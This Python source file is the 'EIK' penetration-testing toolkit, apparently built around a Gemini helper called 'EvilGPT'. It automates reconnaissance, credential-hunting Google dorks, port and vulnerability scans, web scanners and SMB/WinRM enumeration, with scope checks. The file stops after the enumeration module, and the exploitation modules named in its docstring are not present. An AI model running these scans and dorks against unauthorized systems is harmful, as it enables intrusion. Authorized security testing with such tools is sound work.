#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations

"""
EIK - Ethical Intelligence Toolkit v3.0 (AI-POWERED)
===================================================
Founder: Ayush Yadav

One-shot interactive penetration testing toolkit with EvilGPT (Gemini) as the
intelligence hub: every tool output is collected and fed to the AI, and the AI
is what briefs the user.

  python3 EIK.py                             # interactive wizard (AI on by default)
  python3 EIK.py -t 10.0.0.5 -m all          # non-interactive full run
  python3 EIK.py -t http://x.com/ -m 1,3,7   # pick modules
  python3 EIK.py --no-ai ...                 # tool-only mode (no Gemini)

Modules
  1  Reconnaissance   whois, dig, subfinder, dnsrecon, theHarvester, dorks, httpx
  2  Port Scan        masscan, nmap -sV -sC (+ --script vuln), sslscan
  3  Web Scan         whatweb, nikto, nuclei, gobuster/ffuf, wpscan (auto)
  4  Service Enum     enum4linux, smbmap, netexec (SMB/WinRM), searchsploit
  5  Exploitation     sqlmap, hydra + AUTO-ATTACK, metasploit + COMPREHENSIVE v2.0
  5b Advanced Exploit 10 Categories, 100+ Vulnerability Vectors (Injection, Auth, Access, Server, Client, Config, Logic, Crypto, DoS, Memory)
  6  Post-Exploit     msfvenom payloads, persistence rc, ncat cheat-sheet
  7  Report           findings.json + report.md + report.pdf
  8  AI Hub           EvilGPT: phase briefings, full analysis, chat

Requires: Kali Linux + tools listed in --help. AI requires a Gemini API key
(GEMINI_API_KEY) and eik_ai.py in the same directory.
"""

import argparse
import datetime
import hashlib
import ipaddress
import json
import logging
import os
import re
import shlex
import shutil
import subprocess
import sys
import time
import urllib.parse
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

try:
    from eik_ai import AICopilot
    HAVE_AI = True
except ImportError:
    HAVE_AI = False

try:
    from exploit_extensions_v2 import ComprehensiveExploitationCoordinator
    HAVE_ADVANCED_EXPLOIT = True
except ImportError:
    try:
        from exploit_extensions import MasterExploitationModule
        HAVE_ADVANCED_EXPLOIT = True
    except ImportError:
        HAVE_ADVANCED_EXPLOIT = False

__version__ = "3.1"
FOUNDER = "Ayush Yadav"
PROG = "EIK"

# ---------------------------------------------------------------------------
# Logging & Colors
# ---------------------------------------------------------------------------

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"

# Foreground colors
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

# Bright colors
BRIGHT_BLACK = "\033[90m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
BRIGHT_WHITE = "\033[97m"

# Logging colors
COLORS = {"DEBUG": CYAN, "INFO": GREEN, "WARNING": YELLOW,
          "ERROR": RED, "CRITICAL": BRIGHT_RED}


class ColoredFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        record.msg = f"{COLORS.get(record.levelname, '')}{record.msg}{RESET}"
        return super().format(record)


def get_logger(verbose: bool = False) -> logging.Logger:
    lg = logging.getLogger("eik")
    if not lg.handlers:
        h = logging.StreamHandler(sys.stdout)
        h.setFormatter(ColoredFormatter(f"{BOLD}%(levelname)-8s{RESET} %(message)s"))
        lg.addHandler(h)
    lg.setLevel(logging.DEBUG if verbose else logging.INFO)
    return lg


log = get_logger()

# ---------------------------------------------------------------------------
# ASCII Art Banner
# ---------------------------------------------------------------------------

def print_banner():
    """Print EIK ASCII art banner with colors"""
    # ANSI color codes
    GREEN = "\033[32m"
    BRIGHT_GREEN = "\033[92m"
    CYAN = "\033[36m"
    END = "\033[0m"
    
    banner = f"""{BRIGHT_GREEN}
+--- EIK v3.0 ETHICAL HACKING TOOLKIT -----+
| COMPREHENSIVE AI-POWERED SUITE           |
|                                           |
| [*] Reconnaissance                        |
| [*] Vulnerability Scan            INFO   |
| [*] Exploitation                  ====== |
| [*] Post-Exploitation             Ver: 3 |
| [*] Password Attacks               AI:OK |
| [*] Wireless Testing               Vecs:1|
| [*] Web Application Testing         Mods |
| [*] Forensics                      Ready |
| [*] Reporting                            |
| [*] AI Assisted Analysis                 |
|                                           |
| [ HACK RESPONSIBLY | DEFEND FEARLESSLY ] |
|          Founded by Ayush Yadav          |
|                                           |
+--- Production Ready ----------------------+{END}
    """
    print(banner)

# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------

TOOL_INFO: Dict[str, Dict[str, Any]] = {
    "whois":        {"bins": ["whois"],        "apt": "whois",            "desc": "domain registration data"},
    "dig":          {"bins": ["dig"],          "apt": "dnsutils",         "desc": "DNS lookups"},
    "subfinder":    {"bins": ["subfinder"],    "apt": "subfinder",        "desc": "passive subdomain discovery"},
    "dnsrecon":     {"bins": ["dnsrecon"],     "apt": "dnsrecon",         "desc": "DNS enumeration"},
    "theHarvester": {"bins": ["theHarvester"], "apt": "theharvester",     "desc": "OSINT emails/hosts"},
    "httpx":        {"bins": ["httpx"],        "apt": "httpx",            "desc": "live host / tech probing"},
    "masscan":      {"bins": ["masscan"],      "apt": "masscan",          "desc": "fast full-port scanner"},
    "nmap":         {"bins": ["nmap"],         "apt": "nmap",             "desc": "port/service scanner"},
    "sslscan":      {"bins": ["sslscan"],      "apt": "sslscan",          "desc": "TLS cipher analysis"},
    "whatweb":      {"bins": ["whatweb"],      "apt": "whatweb",          "desc": "web fingerprinting"},
    "nikto":        {"bins": ["nikto"],        "apt": "nikto",            "desc": "web server scanner"},
    "nuclei":       {"bins": ["nuclei"],       "apt": "nuclei",           "desc": "template-based vuln scanner"},
    "gobuster":     {"bins": ["gobuster"],     "apt": "gobuster",         "desc": "directory brute-forcer"},
    "ffuf":         {"bins": ["ffuf"],         "apt": "ffuf",             "desc": "fuzzing / dir brute-forcer"},
    "wpscan":       {"bins": ["wpscan"],       "apt": "wpscan",           "desc": "WordPress scanner"},
    "enum4linux":   {"bins": ["enum4linux-ng", "enum4linux"], "apt": "enum4linux-ng", "desc": "SMB enumeration"},
    "smbmap":       {"bins": ["smbmap"],       "apt": "smbmap",           "desc": "SMB share mapper"},
    "netexec":      {"bins": ["netexec", "crackmapexec"], "apt": "netexec", "desc": "SMB/WinRM enum & spraying"},
    "searchsploit": {"bins": ["searchsploit"], "apt": "exploitdb",        "desc": "local exploit database"},
    "sqlmap":       {"bins": ["sqlmap"],       "apt": "sqlmap",           "desc": "SQL injection automation"},
    "hydra":        {"bins": ["hydra"],        "apt": "hydra",            "desc": "online password cracking"},
    "msfconsole":   {"bins": ["msfconsole"],   "apt": "metasploit-framework", "desc": "Metasploit console"},
    "msfvenom":     {"bins": ["msfvenom"],     "apt": "metasploit-framework", "desc": "payload generator"},
    "ncat":         {"bins": ["ncat"],         "apt": "ncat",             "desc": "netcat re-implementation"},
}

SEV_ORDER = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "Info": 0}

SCAN_PROFILES = {
    "fast":    {"masscan_rate": 5000, "nmap_timing": "-T4", "extra": []},
    "normal":  {"masscan_rate": 1000, "nmap_timing": "-T4", "extra": []},
    "stealth": {"masscan_rate": 100,  "nmap_timing": "-T1",
                "extra": ["--max-retries", "1", "--max-scan-delay", "10s"]},
}

AUTOSERVICES = {
    "ssh": "ssh", "ftp": "ftp", "telnet": "telnet",
    "ms-wbt-server": "rdp", "netbios-ssn": "smb",
    "microsoft-ds": "smb", "mysql": "mysql", "postgresql": "postgresql",
}

# Modules which may alter a target, recover credentials, or generate payloads.
# They are deliberately gated behind an additional acknowledgement.
ACTIVE_MODULES = {5, 6}


def _scope_entry_matches(host: str, entry: str) -> bool:
    """Return whether a hostname/IP is covered by one scope-file entry."""
    entry = entry.strip().lower().rstrip(".")
    if not entry or entry.startswith("#"):
        return False
    if "://" in entry:
        entry = (urllib.parse.urlparse(entry).hostname or "").lower().rstrip(".")
    host = host.lower().rstrip(".")
    try:
        return ipaddress.ip_address(host) in ipaddress.ip_network(entry, strict=False)
    except ValueError:
        pass
    # A leading dot grants all subdomains but not the apex; an exact domain
    # grants the apex and its subdomains, a practical engagement-scope default.
    if entry.startswith("."):
        return host.endswith(entry)
    return host == entry or host.endswith("." + entry)


def validate_scope(target: "Target", scope_file: str) -> List[str]:
    """Validate a target against a one-entry-per-line authorization scope file."""
    path = Path(scope_file)
    if not path.is_file():
        raise ValueError(f"scope file not found: {path}")
    entries = path.read_text(encoding="utf-8").splitlines()
    allowed = [line.strip() for line in entries if line.strip() and not line.lstrip().startswith("#")]
    if not allowed:
        raise ValueError(f"scope file has no usable entries: {path}")
    if not any(_scope_entry_matches(target.host, entry) for entry in allowed):
        raise ValueError(f"target '{target.host}' is not covered by {path}")
    return allowed


def write_run_manifest(outdir: Path, target: "Target", args: argparse.Namespace,
                       choices: List[int], scope_entries: List[str]) -> Path:
    """Persist the engagement declaration so reports can be audited later."""
    outdir.mkdir(parents=True, exist_ok=True)
    manifest = {
        "tool": PROG,
        "version": __version__,
        "started_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "target": target.raw,
        "target_host": target.host,
        "engagement_id": args.engagement_id,
        "authorized": bool(args.authorized),
        "scope_file": str(Path(args.scope).resolve()) if args.scope else None,
        "scope_entries": scope_entries,
        "modules": choices,
        "active_testing": bool(args.allow_active),
        "dry_run": bool(args.dry_run),
    }
    path = outdir / "run_manifest.json"
    path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return path

# ---------------------------------------------------------------------------
# Target parsing
# ---------------------------------------------------------------------------


def is_ip(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def _fallback_domain(host: str) -> str:
    parts = host.split(".")
    if len(parts) <= 2:
        return host
    multi = {"co", "com", "org", "net", "gov", "ac", "edu", "gen", "mil",
             "ne", "nhs", "plc", "sch"}
    if len(parts) >= 3 and parts[-2] in multi:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])


def public_suffix(host: str) -> str:
    try:
        extracted = __import__("tldextract").extract(host)
        registered = getattr(extracted, "top_domain_under_public_suffix", None)
        if registered is None:  # Compatibility with older tldextract releases.
            registered = extracted.registered_domain
        return registered or host
    except Exception:  # noqa: BLE001
        return _fallback_domain(host)


class Target:
    def __init__(self, raw: str):
        raw = raw.strip()
        if not raw:
            raise ValueError("empty target")
        if "://" not in raw and raw.lower().startswith("www."):
            raw = "http://" + raw
        self.raw = raw
        self.is_url = "://" in raw
        self.scheme = self.base = self.full_url = None
        self.path = self.query = None
        self.port: Optional[int] = None
        if self.is_url:
            u = urllib.parse.urlparse(raw)
            self.scheme = u.scheme.lower()
            if self.scheme not in ("http", "https"):
                raise ValueError("URL target scheme must be http or https")
            self.host = (u.hostname or "").strip("[]")
            if not self.host:
                raise ValueError("URL target must include a hostname")
            self.port = u.port or (443 if self.scheme == "https" else 80)
            self.path = u.path or "/"
            self.query = u.query
            self.base = f"{self.scheme}://{u.netloc}"
            self.full_url = raw if (u.path and u.path != "/") or u.query else self.base + "/"
        else:
            host = raw
            if raw.count(":") == 1:
                host, _, port = raw.partition(":")
                try:
                    self.port = int(port)
                except ValueError:
                    host = raw
            self.host = host
        self.is_ip = is_ip(self.host)
        self.domain = self.host if self.is_ip else public_suffix(self.host)

    def summary(self) -> str:
        s = f"\n{BRIGHT_CYAN}┌─ {BRIGHT_GREEN}🎯 TARGET INFO{BRIGHT_CYAN} ──────────────────────────────────────────┐{RESET}\n"
        s += f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Host{RESET}       {CYAN}→{RESET} {BRIGHT_GREEN}{self.host}{RESET}\n"
        s += f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Type{RESET}       {CYAN}→{RESET} {('🔗 IP address' if self.is_ip else f'🌐 Domain')}\n"
        if self.base:
            s += f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Base URL{RESET}   {CYAN}→{RESET} {BRIGHT_GREEN}{self.base}{RESET}\n"
            if self.query:
                s += f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Full URL{RESET}   {CYAN}→{RESET} {BRIGHT_GREEN}{self.full_url}{RESET}\n"
        if self.port:
            s += f"{BRIGHT_CYAN}│{RESET} {BRIGHT_YELLOW}Port{RESET}       {CYAN}→{RESET} {BRIGHT_YELLOW}{self.port}{RESET}\n"
        s += f"{BRIGHT_CYAN}└─────────────────────────────────────────────────────────────────────────────┘{RESET}"
        return s

# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------


class Runner:
    def __init__(self, outdir: Path, dry_run: bool = False):
        self.outdir = outdir
        self.dry_run = dry_run
        self.artifacts: Dict[str, Any] = {}

    @staticmethod
    def have_any(bins: List[str]) -> bool:
        return any(shutil.which(b) for b in bins)

    def have(self, tool: str) -> bool:
        return self.have_any(TOOL_INFO.get(tool, {}).get("bins", [tool]))

    def check(self, tool: str) -> bool:
        if not self.have(tool):
            info = TOOL_INFO.get(tool, {})
            log.warning(f"'{tool}' not installed - skipping ({info.get('desc', '')})")
            return False
        return True

    def save(self, phase: str, name: str, data: Any) -> Path:
        d = self.outdir / phase
        d.mkdir(parents=True, exist_ok=True)
        p = d / f"{name}.json"
        p.write_text(json.dumps(data, indent=2, default=str))
        return p

    def write(self, phase: str, name: str, text: str, suffix: str = "txt") -> Path:
        d = self.outdir / phase
        d.mkdir(parents=True, exist_ok=True)
        p = d / f"{name}.{suffix}"
        p.write_text(text)
        return p

    def run(self, cmd: List[str], timeout: int = 900, phase: str = "",
            name: str = "") -> Optional[subprocess.CompletedProcess]:
        log.info("$ " + " ".join(shlex.quote(c) for c in cmd))
        if self.dry_run:
            log.debug("[dry-run] not executed")
            return None
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            log.error(f"timed out after {timeout}s: {' '.join(cmd[:4])}...")
            return None
        except FileNotFoundError:
            log.error(f"binary missing: {cmd[0]}")
            return None
        if proc.returncode != 0:
            log.warning(f"exit {proc.returncode}: {proc.stderr.strip()[:200]}")
        if phase and name:
            self.save(phase, name, {"cmd": cmd, "rc": proc.returncode,
                                    "stdout": proc.stdout, "stderr": proc.stderr})
        return proc

    def background(self, cmd: List[str], logfile: Path) -> Optional[int]:
        log.info("$ " + " ".join(shlex.quote(c) for c in cmd))
        if self.dry_run:
            log.info("[dry-run] would launch listener in background")
            return -1
        logfile.parent.mkdir(parents=True, exist_ok=True)
        f = open(logfile, "w")
        try:
            proc = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT,
                                    start_new_session=True)
            return proc.pid
        except Exception as exc:  # noqa: BLE001
            log.error(f"failed to launch background process: {exc}")
            return None

    def run_many(self, jobs: List[Tuple[str, Callable[[], None]]],
                 workers: int = 3) -> None:
        log.info(f"running {len(jobs)} jobs in parallel ({workers} workers)")
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = {ex.submit(fn): label for label, fn in jobs}
            for fut in as_completed(futs):
                label = futs[fut]
                try:
                    fut.result()
                except Exception as exc:  # noqa: BLE001
                    log.error(f"job '{label}' failed: {exc}")


def load_open_ports(r: Runner) -> List[Dict[str, Any]]:
    p = r.outdir / "scan" / "open_ports.json"
    if p.exists():
        try:
            return json.loads(p.read_text())
        except json.JSONDecodeError:
            pass
    return []

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def wordlist_exists(runner: Runner, path: str) -> bool:
    return Path(path).exists() and Path(path).stat().st_size > 0


def detect_lhost() -> str:
    try:
        out = subprocess.run(["hostname", "-I"], capture_output=True, text=True,
                             timeout=5).stdout.split()
        for ip in out:
            if ip.startswith(("10.", "192.168.", "172.")):
                return ip
        if out:
            return out[0]
    except Exception:  # noqa: BLE001
        pass
    return "127.0.0.1"


def get_copilot(args: argparse.Namespace) -> Optional[Any]:
    """Build EvilGPT if available and a key is present, else None."""
    if not HAVE_AI:
        log.warning("eik_ai.py not found - AI hub disabled (place it next to EIK.py)")
        return None
    key = args.ai_key or os.environ.get("GEMINI_API_KEY") \
        or os.environ.get("EIK_GEMINI_KEY")
    if not key:
        log.warning("AI hub disabled - set GEMINI_API_KEY or --ai-key to enable EvilGPT")
        return None
    try:
        return AICopilot(key, args.ai_model)
    except Exception as exc:  # noqa: BLE001
        log.warning(f"AI hub init failed: {exc}")
        return None

# ---------------------------------------------------------------------------
# Module 1 - Reconnaissance
# ---------------------------------------------------------------------------


class ReconModule:
    def __init__(self, r: Runner, t: Target):
        self.r, self.t = r, t

    def _httpx(self) -> None:
        subs = self.r.outdir / "recon" / "subdomains.txt"
        if not self.r.check("httpx") or not subs.exists() or not subs.stat().st_size:
            return
        out = str(self.r.outdir / "recon" / "httpx_live.txt")
        self.r.run(["httpx", "-l", str(subs), "-title", "-tech-detect",
                    "-status-code", "-o", out], timeout=900,
                   phase="recon", name="httpx")

    def run(self) -> None:
        log.info("=== [1/7] RECONNAISSANCE ===")
        if self.r.check("whois"):
            self.r.run(["whois", self.t.host], timeout=60, phase="recon", name="whois")
        if self.r.check("dig"):
            for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]:
                self.r.run(["dig", "+short", self.t.host, rtype], timeout=30,
                           phase="recon", name=f"dns_{rtype.lower()}")
        if not self.t.is_ip:
            if self.r.check("subfinder"):
                out = str(self.r.outdir / "recon" / "subdomains.txt")
                self.r.run(["subfinder", "-d", self.t.domain, "-silent", "-o", out],
                           timeout=600, phase="recon", name="subfinder")
            if self.r.check("dnsrecon"):
                out = str(self.r.outdir / "recon" / "dnsrecon.json")
                self.r.run(["dnsrecon", "-d", self.t.domain, "-t", "std", "-j", out],
                           timeout=600, phase="recon", name="dnsrecon")
            if self.r.check("theHarvester"):
                out = str(self.r.outdir / "recon" / "theharvester.html")
                self.r.run(["theHarvester", "-d", self.t.domain, "-b", "all",
                            "-f", out], timeout=900, phase="recon", name="theharvester")
        dorks = self.r.write("recon", "dorks", "\n".join(
            f"{i+1}. {q}" for i, q in enumerate([
                f"site:{self.t.host}",
                f"site:{self.t.host} filetype:pdf",
                f"site:{self.t.host} filetype:sql OR filetype:bak OR filetype:env",
                f"site:{self.t.host} inurl:admin",
                f"site:{self.t.host} inurl:login",
                f"site:{self.t.host} intitle:\"index of\"",
                f"site:{self.t.host} intext:password",
                f"inurl:\"{self.t.host}\" intitle:phpinfo",
            ])), "txt")
        log.info(f"dork queries -> {dorks}")
        self._httpx()

# ---------------------------------------------------------------------------
# Module 2 - Port Scan
# ---------------------------------------------------------------------------


class PortScanModule:
    def __init__(self, r: Runner, t: Target, vuln: bool = False,
                 profile: str = "normal"):
        self.r, self.t = r, t
        self.vuln = vuln
        self.profile = SCAN_PROFILES.get(profile, SCAN_PROFILES["normal"])
        self.open_ports: List[Dict[str, Any]] = []

    def _masscan(self) -> Optional[List[int]]:
        if not self.r.check("masscan"):
            return None
        if not hasattr(os, "geteuid") or os.geteuid() != 0:
            log.warning("masscan needs root - falling back to nmap top ports")
            return None
        out = self.r.outdir / "scan" / "masscan.txt"
        self.r.run(["masscan", "-p1-65535", "--rate", str(self.profile["masscan_rate"]),
                    "-oL", str(out), self.t.host], timeout=1800,
                   phase="scan", name="masscan")
        ports = []
        if out.exists():
            for line in out.read_text().splitlines():
                m = re.match(r"open\s+tcp\s+(\d+)", line)
                if m:
                    ports.append(int(m.group(1)))
        return sorted(set(ports))

    def _nmap(self, ports: Optional[List[int]]) -> None:
        if not self.r.check("nmap"):
            return
        if ports:
            plist = ",".join(str(p) for p in ports)
            log.info(f"nmap targeting {len(ports)} ports found by masscan")
        else:
            plist = "22,80,443,3306,8080,8443,139,445,21,25,3389,5900,161,53"
        self.r.run(["nmap", "-sV", "-sC", "-Pn", self.profile["nmap_timing"],
                    *self.profile["extra"],
                    "-oA", str(self.r.outdir / "scan" / "nmap_scan"),
                    "-p", plist, self.t.host], timeout=2400,
                   phase="scan", name="nmap")
        if self.vuln:
            log.info("running nmap --script vuln (slow, one pass)")
            self.r.run(["nmap", "-Pn", "-sV", "--script", "vuln",
                        "-oA", str(self.r.outdir / "scan" / "nmap_vuln"),
                        "-p", plist, self.t.host], timeout=5400,
                       phase="scan", name="nmap_vuln")

    def _parse_nmap(self) -> None:
        path = self.r.outdir / "scan" / "nmap_scan.xml"
        if not path.exists():
            return
        try:
            root = ET.parse(str(path)).getroot()
        except ET.ParseError:
            return
        for host in root.findall(".//host"):
            addr = host.find("address")
            ip = addr.get("addr", "?") if addr is not None else "?"
            for port in host.findall(".//port"):
                state = port.find("state")
                if state is None or state.get("state") != "open":
                    continue
                svc = port.find("service")
                self.open_ports.append({
                    "ip": ip,
                    "port": int(port.get("portid", 0)),
                    "proto": port.get("protocol", "tcp"),
                    "service": svc.get("name", "unknown") if svc is not None else "unknown",
                    "product": svc.get("product", "") if svc is not None else "",
                    "version": svc.get("version", "") if svc is not None else "",
                })
        self.r.save("scan", "open_ports", self.open_ports)
        log.info(f"{len(self.open_ports)} open port(s) recorded")

    def _sslscan(self) -> None:
        if not self.r.check("sslscan"):
            return
        for p in self.open_ports:
            if p["port"] in (443, 8443, 993, 995, 636):
                self.r.run(["sslscan", "--no-colour", f"{self.t.host}:{p['port']}"],
                           timeout=300, phase="scan", name=f"sslscan_{p['port']}")

    def run(self) -> None:
        log.info("=== [2/7] PORT SCAN ===")
        ports = self._masscan()
        self._nmap(ports)
        self._parse_nmap()
        self._sslscan()

# ---------------------------------------------------------------------------
# Module 3 - Web Scan
# ---------------------------------------------------------------------------


class WebScanModule:
    def __init__(self, r: Runner, t: Target, parallel: bool = False):
        self.r, self.t = r, t
        self.parallel = parallel

    def _whatweb(self) -> None:
        if not self.r.check("whatweb"):
            return
        out = str(self.r.outdir / "web" / "whatweb.json")
        self.r.run(["whatweb", "-a", "3", f"--log-json={out}", self.t.base],
                   timeout=600, phase="web", name="whatweb")

    def _http_security_baseline(self) -> None:
        """Collect low-impact HTTP hardening signals without an external scanner."""
        if self.r.dry_run:
            self.r.save("web", "http_baseline", {"target": self.t.base, "dry_run": True,
                                                    "findings": []})
            return
        request = urllib.request.Request(self.t.base, method="GET", headers={
            "User-Agent": f"{PROG}/{__version__} authorized security assessment",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        })
        document: Dict[str, Any] = {"target": self.t.base, "checked_at":
                                     datetime.datetime.now(datetime.timezone.utc).isoformat(),
                                     "findings": []}
        try:
            with urllib.request.urlopen(request, timeout=15) as response:
                headers = {key.lower(): value for key, value in response.headers.items()}
                set_cookies = response.headers.get_all("Set-Cookie") or []
                document.update({"final_url": response.geturl(), "status": response.status,
                                 "headers": headers})
        except (urllib.error.URLError, ValueError, TimeoutError) as exc:
            document["error"] = str(exc)
            self.r.save("web", "http_baseline", document)
            log.warning(f"HTTP baseline unavailable: {exc}")
            return

        findings = document["findings"]
        def add(title: str, severity: str, description: str, remediation: str,
                evidence: str = "") -> None:
            findings.append({"title": title, "severity": severity,
                             "description": description, "remediation": remediation,
                             "evidence": evidence})

        final_url = str(document["final_url"])
        if self.t.scheme == "https" and not headers.get("strict-transport-security"):
            add("Missing HSTS header", "Medium", "HTTPS response has no Strict-Transport-Security header.",
                "Set Strict-Transport-Security with a suitable max-age after validating HTTPS coverage.")
        if final_url.startswith("http://"):
            add("HTTP endpoint did not redirect to HTTPS", "High",
                "The assessed URL remained on unencrypted HTTP.", "Redirect all HTTP traffic to HTTPS.", final_url)
        if not headers.get("content-security-policy"):
            add("Missing Content-Security-Policy", "Medium",
                "No Content-Security-Policy header was observed.",
                "Deploy a restrictive CSP and refine it using report-only mode first.")
        if headers.get("x-content-type-options", "").lower() != "nosniff":
            add("Missing X-Content-Type-Options", "Low", "Response does not set X-Content-Type-Options: nosniff.",
                "Set X-Content-Type-Options: nosniff.")
        if not (headers.get("x-frame-options") or "frame-ancestors" in headers.get("content-security-policy", "").lower()):
            add("Clickjacking protection not detected", "Medium",
                "Neither X-Frame-Options nor CSP frame-ancestors was observed.",
                "Set CSP frame-ancestors (preferred) or X-Frame-Options.")
        if not headers.get("referrer-policy"):
            add("Missing Referrer-Policy", "Low", "No Referrer-Policy header was observed.",
                "Set Referrer-Policy, commonly strict-origin-when-cross-origin.")
        if not headers.get("permissions-policy"):
            add("Missing Permissions-Policy", "Low", "No Permissions-Policy header was observed.",
                "Restrict browser capabilities that the application does not need.")
        origin, credentials = headers.get("access-control-allow-origin"), headers.get("access-control-allow-credentials", "")
        if origin == "*" and credentials.lower() == "true":
            add("Unsafe CORS policy", "High", "CORS permits any origin while allowing credentials.",
                "Use an explicit allowlist of trusted origins; never combine wildcard origin with credentials.")
        elif origin == "*":
            add("Permissive CORS policy", "Low", "CORS permits any origin.",
                "Confirm public cross-origin access is intended; otherwise use an explicit origin allowlist.")
        if headers.get("server"):
            add("Server technology disclosure", "Info", "The Server header reveals implementation details.",
                "Minimize version and implementation disclosures where practical.", headers["server"])
        for cookie in set_cookies:
            attrs = cookie.lower()
            name = cookie.split("=", 1)[0]
            missing = [label for label, marker in (("Secure", "secure"), ("HttpOnly", "httponly"),
                                                   ("SameSite", "samesite")) if marker not in attrs]
            if missing:
                add("Cookie missing security attributes", "Medium",
                    f"Cookie '{name}' is missing: {', '.join(missing)}.",
                    "Set Secure, HttpOnly, and an appropriate SameSite attribute for session cookies.", name)
        self.r.save("web", "http_baseline", document)
        log.info(f"HTTP baseline: {len(findings)} hardening signal(s) recorded")

    def _nikto(self) -> None:
        if not self.r.check("nikto"):
            return
        out = str(self.r.outdir / "web" / "nikto.json")
        self.r.run(["nikto", "-h", self.t.base, "-Format", "json", "-output", out],
                   timeout=1800, phase="web", name="nikto")

    def _nuclei(self) -> None:
        if not self.r.check("nuclei"):
            return
        out = str(self.r.outdir / "web" / "nuclei.jsonl")
        self.r.run(["nuclei", "-u", self.t.base, "-jsonl", "-o", out,
                    "-silent", "-timeout", "10"], timeout=3600,
                   phase="web", name="nuclei")

    def _dirbust(self) -> None:
        wl = "/usr/share/wordlists/dirb/common.txt"
        if not wordlist_exists(self.r, wl):
            wl = "/usr/share/dirb/wordlists/common.txt"
        if not wordlist_exists(self.r, wl):
            log.warning("no dirb wordlist found - skipping directory brute-force")
            return
        if self.r.have("gobuster"):
            out = str(self.r.outdir / "web" / "gobuster.txt")
            self.r.run(["gobuster", "dir", "-u", self.t.base, "-w", wl,
                        "-q", "-t", "20", "--no-error", "-o", out],
                       timeout=1800, phase="web", name="gobuster")
        elif self.r.check("ffuf"):
            out = str(self.r.outdir / "web" / "ffuf.json")
            self.r.run(["ffuf", "-u", f"{self.t.base}/FUZZ", "-w", wl,
                        "-o", out, "-of", "json", "-t", "20", "-s"],
                       timeout=1800, phase="web", name="ffuf")

    def _wpscan(self) -> None:
        if not self.r.check("wpscan"):
            return
        wj = self.r.outdir / "web" / "whatweb.json"
        is_wp = False
        if wj.exists():
            try:
                data = json.loads(wj.read_text())
                for target in data if isinstance(data, list) else []:
                    for plugin in target.get("plugins", {}):
                        if "wordpress" in plugin.lower():
                            is_wp = True
            except (json.JSONDecodeError, OSError):
                pass
        if not is_wp:
            log.info("WordPress not detected - skipping wpscan")
            return
        log.info("WordPress detected - running wpscan")
        out = str(self.r.outdir / "web" / "wpscan.json")
        self.r.run(["wpscan", "--url", self.t.base, "--random-user-agent",
                    "--enumerate", "u,vp", "--format", "json", "--output", out],
                   timeout=1800, phase="web", name="wpscan")

    def run(self) -> None:
        if not self.t.base:
            log.warning("no URL provided - skipping web scan (run with a URL)")
            return
        log.info(f"=== [3/7] WEB SCAN ({self.t.base}) ===")
        jobs = [("http_baseline", self._http_security_baseline), ("whatweb", self._whatweb), ("nikto", self._nikto),
                ("nuclei", self._nuclei)]
        if self.parallel:
            self.r.run_many(jobs)
        else:
            for _, fn in jobs:
                fn()
        self._dirbust()
        self._wpscan()

# ---------------------------------------------------------------------------
# Module 4 - Service Enumeration
# ---------------------------------------------------------------------------


class ServiceEnumModule:
    def __init__(self, r: Runner, t: Target):
        self.r, self.t = r, t

    def _smb(self) -> None:
        if self.r.check("enum4linux"):
            bins = TOOL_INFO["enum4linux"]["bins"]
            self.r.run([bins[0], "-a", self.t.host], timeout=900,
                       phase="enum", name="enum4linux")
        if self.r.check("smbmap"):
            self.r.run(["smbmap", "-H", self.t.host], timeout=300,
                       phase="enum", name="smbmap")
        if self.r.check("netexec"):
            self.r.run(["netexec", "smb", self.t.host, "--shares", "--users"],
                       timeout=600, phase="enum", name="netexec_smb")

    def _winrm(self) -> None:
        if self.r.check("netexec"):
            self.r.run(["netexec", "winrm", self.t.host], timeout=600,
                       phase="enum", name="netexec_winrm")

    def _searchsploit(self) -> None:
        if not self.r.check("searchsploit"):
            return
        queries = set()
        for p in load_open_ports(self.r):
            if p["service"] in ("http", "https", "ssl/http"):
                continue
            svc = " ".join(x for x in (p.get("product"), p.get("version")) if x)
            if svc:
                queries.add(f"{p['service']} {svc}")
        for q in sorted(queries)[:10]:
            self.r.run(["searchsploit", "--json", q], timeout=120,
                       phase="enum", name=f"searchsploit_{re.sub(r'\\W+', '_', q)[:60]}")

    def run(self) -> None:
        log.info("=== [4/7] SERVICE ENUMERATION ===")
        ports = load_open_ports(self.r)
        if any(p["port"] in (139, 445) for p in ports):
            log.info("SMB (139/445) open - running SMB enumeration")
            self._smb()
        if any(p["port"] in (5985, 5986) for p in ports):
            log.info("WinRM (5985/5986) open - running WinRM enumeration")
            self._winrm()
        self._searchsploit()

# ---------------------------------------------------------------------------
